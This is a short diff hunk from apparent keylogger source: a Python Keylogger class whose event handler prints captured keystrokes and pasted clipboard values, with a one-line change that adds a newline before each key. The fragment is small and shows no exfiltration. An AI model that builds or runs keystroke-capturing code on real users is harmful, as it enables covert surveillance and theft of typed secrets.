@@ -50,7 +50,7 @@ class Keylogger:
                 print(f'[PASTE] = {value}')
                 
             else:
-                print(f'{event.Key}')
+                print(f'\n{event.Key}')
                 
         return True
     
